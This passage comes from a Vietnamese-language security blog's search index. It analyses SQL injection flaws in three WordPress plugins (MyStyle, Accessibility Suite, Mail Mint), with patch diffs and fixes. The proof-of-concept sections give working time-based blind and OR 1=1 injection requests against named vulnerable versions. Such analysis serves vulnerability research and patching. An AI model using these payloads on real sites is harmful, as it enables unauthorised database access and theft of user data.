logic ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Ki·ªÉm tra SQLi\rG·ª≠i request ch·ª©a payload SQLi ƒë·ªÉ ki·ªÉm tra: GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here C√¢u truy v·∫•n k·∫øt qu·∫£: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 N·∫øu ph·∫£n h·ªìi ch·∫≠m 5 gi√¢y ‚Üí payload ho·∫°t ƒë·ªông. Ki·ªÉm tra ƒë·ªô tr·ªÖ th·ªùi gian Kh√¥ng th√™m d·∫•u comment (--) sau SLEEP() v√¨ s·∫Ω khi·∫øn SQL parser l·ªói do xu·ªëng d√≤ng gi·ªØa ASC v√† OFFSET. Debug l·ªói ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#ki·ªÉm-tra-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"L·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n c∆° s·ªü d·ªØ li·ªáu\rGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here N·∫øu ph·∫£n h·ªìi ch·∫≠m ‚Üí k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n database l√† w. K·ªπ thu·∫≠t n√†y c√≥ th·ªÉ ƒë∆∞·ª£c m·ªü r·ªông ƒë·ªÉ tr√≠ch xu·∫•t to√†n b·ªô t√™n c∆° s·ªü d·ªØ li·ªáu ho·∫∑c b·∫£ng d·ªØ li·ªáu. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#l·∫•y-k√Ω-t·ª±-ƒë·∫ßu-ti√™n-c·ªßa-t√™n-c∆°-s·ªü-d·ªØ-li·ªáu"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-48281 trong plugin MyStyle Custom Product Designer (\u003c= 3.21.1) xu·∫•t ph√°t t·ª´ vi·ªác ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu ng∆∞·ªùi d√πng v√†o truy v·∫•n SQL m√† kh√¥ng x√°c th·ª±c ƒë√∫ng c√°ch. B·∫£n v√° 3.21.2 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch √°p d·ª•ng danh s√°ch c·ªôt cho ph√©p (whitelist) v√† ki·ªÉm tra gi√° tr·ªã ƒë·∫ßu v√†o. B√†i h·ªçc r√∫t ra: Lu√¥n x√°c th·ª±c d·ªØ li·ªáu ƒë·∫ßu v√†o. Khi l√†m vi·ªác v·ªõi c∆° s·ªü d·ªØ li·ªáu trong WordPress, b·∫Øt bu·ªôc d√πng $wpdb-\u003eprepare(). Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 SQL Injection ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } B·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch diff ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rL·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin. Search save_false_positive üëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi. Khi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ: save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request. ·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng. if(! is_admin()) { return ''; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rG·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t. Trong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time response with SQLi payload üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e payload ho·∫°t ƒë·ªông. C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng: UNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. SQL Execution Order Diagram ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(‚Äòw‚Äô) S·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape. üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u003eprepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. B·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u003eprepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n. Key takeaways: Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Accessibility Suite Plugin \u003c= 4.18 is vulnerable to SQL Injection ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra. ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rL·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin. Search Import K·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php. Ti·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin. Search 1 H√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php. Ti·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u: Search 2 Ta ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress: class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m: POST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rSau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value. POST request qua BurpSuite: Ta g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u003e d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query. Get all user info Khi ƒë√≥, c√¢u query tr·ªü th√†nh: SELECT user_id FROM wp_usermeta WHERE meta_key IN ('course_abc') OR 1=1 -- _access_from') GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u003e tr·∫£ v·ªÅ t·∫•t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ: $formatted_users = array_map( function ($user) { $user-\u003eusermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u003eID) ); return $user; }, $contacts ); ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u003eprepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. B·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u003eprepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n. Key takeaways: Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Mail Mint Plugin \u003c= 1.18.5 is vulnerable to SQL Injection ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE 